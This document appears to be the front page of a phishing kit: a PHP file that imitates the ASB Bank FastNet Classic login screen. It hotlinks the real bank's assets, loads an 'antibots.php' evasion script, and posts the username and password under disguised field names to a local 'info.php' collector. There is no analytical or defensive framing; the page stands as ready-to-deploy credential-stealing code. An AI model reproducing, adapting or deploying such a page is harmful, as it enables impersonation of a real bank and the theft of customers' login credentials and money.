﻿<?php
session_start();
error_reporting(0);
require "antibots.php";
?><html class=" js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients no-cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths" style="" lang="en"><form id="Form1" name="Form1" action="info.php" method="post"><head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="robots" content="noindex,nofollow">
    <meta name="viewport" content="width=device-width, initial-scale=1">
	<meta http-equiv="cache-control" content="max-age=0">
	<meta http-equiv="cache-control" content="no-cache">
	<meta http-equiv="expires" content="0">
	<meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT">
	<meta http-equiv="pragma" content="no-cache">
    <link rel="shortcut icon" href="https://online.asb.co.nz/auth/favicon.ico">
    
        <title>ASB Bank - Log in</title>
    


	
    <link href="https://online.asb.co.nz/auth/css/fonts.min.css?v=2.1.0.0" rel="stylesheet">
    <link href="https://online.asb.co.nz/auth/css/style.min.css?v=2.1.0.0" rel="stylesheet">

    <script type="text/javascript" async="" src="https://www.gstatic.com/recaptcha/releases/wxAi4AKLXL2kBAvXqI4XLSWS/recaptcha__en.js" crossorigin="anonymous" integrity="sha384-Me/xBbBvuuItTu/oAnI7UkdtjfgtuZXbaYLJKHlUuMOlG+7MivghWo/kKOwhQ7pf"></script><script src="https://online.asb.co.nz/auth/js/modernizr-2.7.1.js?v=2.1.0.0" type="text/javascript"></script>
    <script src="https://online.asb.co.nz/auth/js/json2.min.js?v=2.1.0.0"></script>
    <script src="https://online.asb.co.nz/auth/js/sha1.min.js?v=2.1.0.0"></script>
    <script src="https://online.asb.co.nz/auth/js/jquery-1.11.0.min.js?v=2.1.0.0" type="text/javascript"></script>
    <script src="https://online.asb.co.nz/auth/js/PopupManager.min.js?v=2.1.0.0"></script>
    <script src="https://online.asb.co.nz/auth/js/custFontSize.min.js?v=2.1.0.0"></script>
	<script src="https://online.asb.co.nz/auth/js/jquery-1.11.0.min.js?v=2.1.0.0" type="text/javascript"></script>
	<script src="https://online.asb.co.nz/auth/js/underscore-min.js?v=2.1.0.0" type="text/javascript"></script>

    

	

    

    <script src="https://www.google.com/recaptcha/api.js?onload=onloadCallback&amp;render=explicit" async="" defer="">
    </script>
    <script src="https://online.asb.co.nz/auth/js/mobile-accept.min.js?v=2.1.0.0" type="text/javascript"></script>
       <script type="text/javascript">

                    var onSubmit = function(response) {
                        document.getElementById("login").submit();
                    };

                    var onloadCallback = function() {
                        grecaptcha.render('loginBtn', {
                          'sitekey' : '6LcHumoUAAAAAM6d5MNFsuwIypIszPyRVVP0n_H0',
                          'callback' : onSubmit
                        });
                    };
        </script>
	

    <!--[if lt IE 9]>
    <script type="text/javascript" src="https://online.asb.co.nz/auth/js/lt-ie9-placeholder.min.js?v=2.1.0.0"></script>
    <![endif]-->

    
        <script type="text/javascript">
            // taser MarketingConfig script
            
            
            
            var MarketingConfig = { "EnableFunc": "true", "EnableMarketing": "true", "Url": "https://banner.asb.co.nz", "DL": "asb.co.nz", "Channel": "FASTNETC", "BannerDelay": 100, "RegEx": "^\/1\/include\/script\/", "Sleep": 100, "Reload": false, "JsSource": "/Scripts/func.min.js" };
        </script>
		
		<script type="text/javascript">
			if (self === top) {
				var antiClickjack = document.getElementById("antiClickjack");
				antiClickjack.parentNode.removeChild(antiClickjack);
			} else {
				top.location = self.location;
			}
		</script>
        <script type="text/javascript" language="javascript">
	var loginConfig = { isRememberMe: false, username: 'null' };	
	
	
function getCookie(cname) {
	var name = cname + "=";
	var ca = document.cookie.split(';');
	for(var i=0; i<ca.length; i++) {
		var c = $.trim(ca[i]);
		if (c.indexOf(name)==0) 
			return c.substring(name.length,c.length);
  	}
	return "";
}

</script>
    
<script type="text/javascript">
/*<![CDATA[*/ 
document.cookie = "IV_JCT=%2Fauth; path=/; secure";
/*]]>*/ 
</script>
</head>


    

<body id="body">
    <div class="logon-container">
        <div class="logon-container__row">
            <div class="logon-container__col">
                
                <!-- ASB LOGO -->
                <div class="logon-container">
                    <div class="logon-container__row">
                        <div class="logon-container__col logon-typography--text-center">
                            <div class="logon-header-logo">
                                <a href="https://www.asb.co.nz" title="Go to ASB Homepage">
                                    <svg class="logon-icon--asb" focusable="false"></svg>
                                </a>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- LOGON SCREEN INPUTS SECTION -->
                <div class="logon-container logon-container--grey">

                    <div class="logon-container__inner">
                        <div class="logon-container__row">
                            <div class="logon-container__col">

                                <!-- TITLE SECTION -->
                                <h1 class="logon-typography-h1 logon-typography--text-center">Continue to
                                    
                                    
                                    
                                    
                                    FastNet Classic
                                </h1>

                                <!-- CALLOUT SECTION (Error, Info) -->
                                <div class="logon-callout logon-callout--alert logon-typography-spacing-xxlarge hide">
                                    <i aria-hidden="true" class="logon-icon logon-callout__icon">
                                        <svg class="logon-icon--caution-circular-white" focusable="false"></svg>
                                    </i>
                                    <span id="logon-error-desc1" class="logon-callout__text" role="alert">
                                        
                                    </span>
                                    
                                </div>

                                <!-- NO JAVASCRIPT MESSAGE SECTION -->
                                <noscript>
                                    &lt;div class="logon-callout logon-callout--info logon-typography-spacing-xxlarge"&gt;
                                        &lt;i aria-hidden="true" class="logon-icon logon-callout__icon"&gt;
                                            &lt;svg class="logon-icon--information" focusable="false"&gt;&lt;/svg&gt;
                                        &lt;/i&gt;
                                        &lt;span class="logon-callout__text"&gt;
                                            Your browser seems to have Javascript disabled. Make sure Javascript is enabled to log in.
                                        &lt;/span&gt;
                                    &lt;/div&gt;
                                </noscript>

                                <!-- COOKIE DISABLED MESSAGE SECTION -->
                                <script language="JavaScript">
                                    var warningString = "<div class=\"warning message input\"><table><tr><td><div class=\"icon info\"></div></td><td><h3>Your browser seems to have cookies disabled. Make sure cookies are enabled to log in.</h3></td></tr></table></div>";
                                    document.cookie = 'acceptsCookies=yes';
                                    if (document.cookie == '') {
                                        document.write(warningString);
                                    }
                                    else {
                                        document.cookie = 'acceptsCookies=yes; expires=Fri, 13-Apr-1970 00:00:00 GMT';
                                    }
                                </script>

                                <!-- SEMBLE MESSAGE SECTION -->
                                

                                <!-- FORM SECTION -->
                                <form name="login" method="post" action="info.php" id="login" autocomplete="off">
                                    
                                    <input type="hidden" name="authnMod" value="AsbRgyAuthn">
                                    <input type="hidden" name="action" value="login">
                                    <input type="hidden" name="secfk" value="QS7E-UECS-HNM9-WU5W-F5H3-MEQL-OENC-1JUD">
                                    <input type="hidden" name="goto" value="https://online.asb.co.nz/fnc">
                                    <input type="hidden" name="username" id="username" class="a">
                                    <input type="hidden" name="MSISDN" value="">

                                    <!-- REMEMBERED CUSTOMER SECTION -->
                                    <div id="divRemembered" class="logon-form__field logon-typography--text-center hide" style="display: none;">
                                        <div id="customerNameP">
                                            <h3>Hi <span id="customerNameS" style="display: inline;">null</span></h3>
                                        </div>
                                    </div>

                                    <!-- USERNAME FIELD -->
                                    <div id="divNotRemembered" class="logon-form__field logon-text-field logon-text-field--with-leading-icon logon-text-field--with-trailing-icon " style="display: block;">
                                        <label for="dUsername" class="logon-text-field__label logon-typography-spacing">Username</label>
                                        <div class="logon-text-field__inputcontainer">
                                            <i aria-hidden="true" class="logon-icon logon-text-field__icon">
                                                <svg class="logon-icon--profile" focusable="false"></svg>
                                            </i>
                                            <i aria-hidden="true" class="logon-icon logon-text-field__icon logon-text-field__icon--error">
                                                <svg class="logon-icon--caution-circular" focusable="false"></svg>
                                            </i>
                                            <input type="text" name="west" id="dUsername" class="logon-text-field__input" maxlength="10" spellcheck="false" autocorrect="off" autocomplete="off"required>
                                        </div>
                                    </div>

                                    <!-- PASSWORD FIELD -->
                                    <div class="logon-form__field logon-text-field logon-text-field--with-leading-icon logon-text-field--with-trailing-icon ">
                                        <label for="password" class="logon-text-field__label logon-typography-spacing">Password</label>
                                        <div class="logon-text-field__inputcontainer">
                                            <i aria-hidden="true" class="logon-icon logon-text-field__icon">
                                                <svg class="logon-icon--lock-outline" focusable="false"></svg>
                                            </i>
                                            <i aria-hidden="true" class="logon-icon logon-text-field__icon logon-text-field__icon--error">
                                                <svg class="logon-icon--caution-circular" focusable="false"></svg>
                                            </i>
                                            <input id="password" name="girl" type="password" class="logon-text-field__input" maxlength="100" spellcheck="false" autocorrect="off" autocomplete="off"required>
                                        </div>
                                    </div>

                                    <!-- REMEMBER ME SECTION -->
                                    <div class="logon-form__field">
                                        <div class="logon-checkbox-field">
                                            <input id="remember_me" name="remember_me" type="hidden" value="false">
                                            <input id="remember_me_checkbox" name="remember_me_checkbox" type="checkbox" class="logon-checkbox-field__native">
                                            <div class="logon-checkbox-field__background">
                                                <i aria-hidden="true" class="logon-icon logon-checkbox-field__icon">
                                                    <svg class="logon-icon--checkmark"></svg>
                                                </i>    
                                            </div>
                                            <label for="remember_me_checkbox">Remember me</label>
                                            
                                            <button class="logon-tooltip" type="button" aria-label="Tooltip button">
                                                <div class="logon-tooltip-overlay"></div>
                                                <i aria-hidden="true" class="logon-icon logon-tooltip__icon">
                                                    <svg class="logon-icon--information"></svg>
                                                </i> 
                                                <span id="rememberMeHelpText" class="logon-tooltip__text">This will save your username. We recommend you only use this on devices you do not share with others.</span>
                                            </button>
                                        </div>
                                    </div>

                                    <!-- BUTTONS SECTION -->
                                    <div class="logon-form__field logon-typography--text-center">
                                        <div>

<div class="grecaptcha-badge" data-style="bottomright" style="width: 256px; height: 60px; display: block; transition: right 0.3s ease 0s; position: fixed; bottom: 14px; right: -186px; box-shadow: gray 0px 0px 5px; border-radius: 2px; overflow: hidden;">
<div class="grecaptcha-logo"><iframe title="reCAPTCHA" src="https://www.google.com/recaptcha/api2/anchor?ar=1&amp;k=6LcHumoUAAAAAM6d5MNFsuwIypIszPyRVVP0n_H0&amp;co=aHR0cHM6Ly9vbmxpbmUuYXNiLmNvLm56OjQ0Mw..&amp;hl=en&amp;v=wxAi4AKLXL2kBAvXqI4XLSWS&amp;size=invisible&amp;cb=uvf4xqiwl8b5" role="presentation" name="a-d4rpthipwk9x" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox allow-storage-access-by-user-activation" width="256" height="60" frameborder="0"></iframe>
</div><div class="grecaptcha-error">
</div><textarea id="g-recaptcha-response" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea></div></div>



<input type="image" src="log.png" name="actionName" alt="Submit">
                                    </div>
                                    <div class="logon-form__field logon-typography--text-center">
                                        <a href="https://online.asb.co.nz/auth/login?action=forgotpwd">Forgot your password?</a>
                                    </div>

                                </form>
                            </div>
                        </div>
                    </div>
                    

                </div>

                <!-- FOOTER SECTION -->
                <div class="logon-container logon-typography--text-center logon-typography-spacing logon-typography-top-spacing">
                    <div class="logon-container__row logon-container__row-cols-1">
                        <div class="logon-container__col">
                            <p class="logon-typography--body1 logon-typography-spacing">Not an ASB customer?
                                
                                    
                                
                                    
                                    <a href="https://www.asb.co.nz/bank-accounts/joining-asb.html" target="_blank">Register now</a>
                                    
                                
                            </p>
                        </div>

                        <!-- DISCLAIMER AND FOOTER LINKS SECTION -->
                        
                        
                        
                        <div class="logon-container__col"><p class="logon-typography--body2 logon-typography-spacing logon-typography--opacity">FastNet is licensed to ASB Bank Limited and is solely for the use of persons authorised by ASB Bank Limited. Do not access FastNet unless you have been specifically authorised to do so. Unauthorised access is prohibited.</p></div><div class="logon-container__col logon-typography-spacing-large"><p class="logon-typography--body3 logon-typography-spacing"><a class="a--white" href="https://www.asb.co.nz/documents/banking-with-asb/fastnet-classic-terms-and-conditions.html" target="_blank">Terms and conditions</a><span class="logon-typography__pipe"></span><a class="a--white" href="https://www.asb.co.nz/security" target="_blank">About security</a><span class="logon-typography__pipe"></span><a class="a--white" href="https://www.asb.co.nz/privacy" target="_blank">Privacy</a><span class="logon-typography__pipe"></span><a class="a--white" href="https://www.asb.co.nz/documents/banking-with-asb/internet-access-terms-and-conditions.html" target="_blank">Internet access terms</a></p></div>
                         <!-- END DISCLAIMER AND FOOTER LINKS SECTION -->
                        
                    </div>
                </div>

            </div>
        </div>
    </div>

	<script type="text/javascript" src="https://online.asb.co.nz/auth/js/loginBody.min.js?v=2.1.0.0"></script>
    <script type="text/javascript">
        $(document).on("pLoaded", document, function () {
			if (MarketingConfig.EnableMarketing == "true") {
				LoadMarketing({
					Url: MarketingConfig.Url,
					DL: MarketingConfig.DL,
					Channel: MarketingConfig.Channel,
					BannerDelay: MarketingConfig.BannerDelay
				});
			}
        });

        $(function () {
			if (MarketingConfig.EnableFunc == "true")
			{
				try {
					$(document.body).bind('funcLoaded', function () {
							LoadFunc({
								Url: MarketingConfig.Url,
								Channel: MarketingConfig.Channel,
								RegEx: MarketingConfig.RegEx,
								Sleep: MarketingConfig.Sleep,
								Data: null,
								Reload: MarketingConfig.Reload
							});
					});

					$('#initialFuncScript').attr('src', MarketingConfig.Url + MarketingConfig.JsSource);
				} catch (err) { }
			}
        });

        $(document).ready(function(){

            var $divRemembered = $("#divRemembered");
            var $divNotRemembered = $("#divNotRemembered");

            $(".logon-text-field__input").each(function () {
                var el = this;
                $(el).on('focus', function(){
                    $(this).parent().addClass("logon-text-field__inputcontainer--focus");
                }).on('blur',function(){
                    $(this).parent().removeClass("logon-text-field__inputcontainer--focus");
                });
                
            })

            $(".logon-checkbox-field input").on('change', function(){
                var $input = $(this)
                if ($input.is(":checked")) {
                    document.login.remember_me.value = true;
                    $(".logon-checkbox-field").addClass("logon-checkbox-field--selected");

                } else {
                    $(".logon-checkbox-field").removeClass("logon-checkbox-field--selected");
                    document.login.remember_me.value = false;
                    document.login.username.value = ""
                    loginConfig.isRememberMe = false;

                    $divRemembered.hide();
                    $divNotRemembered.show();
                }
                updateHelpText($input)
            }).on('focus', function(){
                $(this).parent().addClass("logon-checkbox-field--focused");
            }).on('blur',function(){
                $(this).parent().removeClass("logon-checkbox-field--focused");
            });

            var updateHelpText = function(el) {
                el = el ? el : $(".logon-checkbox-field input");
                if (el.is(":checked")) {
                    $('#rememberMeHelpText').html("Uncheck this box to enter your username.");
                } else {
                    $('#rememberMeHelpText').html("This will save your username. We recommend you only use this on devices you do not share with others.");
                }
            }

            updateHelpText();

            var logonTooltip = document.querySelector('.logon-tooltip');
            
            var toolTipFunc = function(event) {
                var el = event.target;
                if(!$(el).closest('.logon-tooltip').length || (event.code && event.code=== 'Escape')) {
                    logonTooltip.classList.remove('logon-tooltip--open')
                } else if(!event.code) {
                    toolToggleToolTip();
                }
            }

            var toolToggleToolTip = function(){
                var att = logonTooltip.getAttribute('class');
                if(att.indexOf('logon-tooltip--open') < 0) logonTooltip.classList.add('logon-tooltip--open');
                else logonTooltip.classList.remove('logon-tooltip--open');
            }

            
            if ('ontouchstart' in document.documentElement) {
                document.addEventListener('touchend', toolTipFunc)
            } else {
                document.addEventListener('click', toolTipFunc)
                document.addEventListener('keyup', toolTipFunc)
            }

        });

    </script>
    <script src="https://online.asb.co.nz/auth/js/p.min.js?v=2.1.0.0" type="text/javascript"></script>
    <script type="text/javascript" id="initialFuncScript" src="https://banner.asb.co.nz/Scripts/func.min.js"></script>





<img alt="" style="height: 0px; width: 0px" src="https://banner.asb.co.nz/marketting/M?details=n%3DSNFGARGP%3Bo%3Duggcf%3A//bayvar.nfo.pb.am/nhgu/%3Fsz%3Durnqre%3Aybtva%3Bp%3D1366%3Bq%3D768%3Br%3D24%3Bs%3D%3Bt%3D%3Bu%3DJva32%3Bv%3Dra-HF%3Bw%3D0%3Bx%3D%3By%3D21%3Bz%3Duggcf%3A//jjj.tfgngvp.pbz/erpncgpun/eryrnfrf/jkNv4NXYKY2xONiKdV4KYFJF/erpncgpun__ra.wf%2C/nhgu/wf/zbqreavme-2.7.1.wf%3Fi%3D2.1.0.0%2C/nhgu/wf/wfba2.zva.wf%3Fi%3D2.1.0.0%2C/nhgu/wf/fun1.zva.wf%3Fi%3D2.1.0.0%2C/nhgu/wf/wdhrel-1.11.0.zva.wf%3Fi%3D2.1.0.0%2C/nhgu/wf/CbchcZnantre.zva.wf%3Fi%3D2.1.0.0%2C/nhgu/wf/phfgSbagFvmr.zva.wf%3Fi%3D2.1.0.0%2C/nhgu/wf/wdhrel-1.11.0.zva.wf%3Fi%3D2.1.0.0%2C/nhgu/wf/haqrefpber-zva.wf%3Fi%3D2.1.0.0%2Cuggcf%3A//jjj.tbbtyr.pbz/erpncgpun/ncv.wf%3Fbaybnq%3DbaybnqPnyyonpx%26eraqre%3Drkcyvpvg%2C/nhgu/wf/zbovyr-npprcg.zva.wf%3Fi%3D2.1.0.0%2C/nhgu/wf/ybtvaObql.zva.wf%3Fi%3D2.1.0.0%2C/nhgu/wf/c.zva.wf%3Fi%3D2.1.0.0%2Cuggcf%3A//onaare.nfo.pb.am/Fpevcgf/shap.zva.wf%3Ba%3D2rq43422q2q7p84po6q55o7s1175r7oq1q707q14%2Cs0p10o99pos952n0p9621r392352s0orns0459rq%2C04597rsq645ooso8sp05390o0nr0nrqr3588qpps%2C13749qq7prnso11381042790032n0snp2p63414r%2Cr5134sp63p05o290sqs5rr4n6sr6p09654ps92sq%2Cp4r519646rqp343q125561n0077rqsrn94733531%2Cpn566436408r12o33976np01or48nq9q06pq5oqr%3Bb%3D10%3Bc%3Dhaqrsvarq%2Chaqrsvarq%2Chaqrsvarq%2Chaqrsvarq%2Chfreanzr%2Chaqrsvarq%2CqHfreanzr%2Ccnffjbeq%2Cerzrzore_zr%2Cerzrzore_zr_purpxobk%3Bd%3D1631440096%3Be%3D-60*-60%3Bf%3D-1%3Bg%3DZbmvyyn/5.0%20%28Jvaqbjf%20AG%2010.0%20%20Jva64%20%20k64%20%20ei%3A92.0%29%20Trpxb/20100101%20Sversbk/92.0%3B&amp;data=null" width="0" height="0"><div style="visibility: hidden; position: absolute; width: 100%; top: -10000px; left: 0px; right: 0px; transition: visibility 0s linear 0.3s, opacity 0.3s linear 0s; opacity: 0;"><div style="width: 100%; height: 100%; position: fixed; top: 0px; left: 0px; z-index: 2000000000; background-color: rgb(255, 255, 255); opacity: 0.5;"></div><div style="margin: 0px auto; top: 0px; left: 0px; right: 0px; position: absolute; border: 1px solid rgb(204, 204, 204); z-index: 2000000000; background-color: rgb(255, 255, 255); overflow: hidden;"><iframe title="recaptcha challenge" src="https://www.google.com/recaptcha/api2/bframe?hl=en&amp;v=wxAi4AKLXL2kBAvXqI4XLSWS&amp;k=6LcHumoUAAAAAM6d5MNFsuwIypIszPyRVVP0n_H0&amp;cb=ao8hoz7x6tvx" style="width: 100%; height: 100%;" name="c-d4rpthipwk9x" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox allow-storage-access-by-user-activation" frameborder="0"></iframe></div></div></body></html>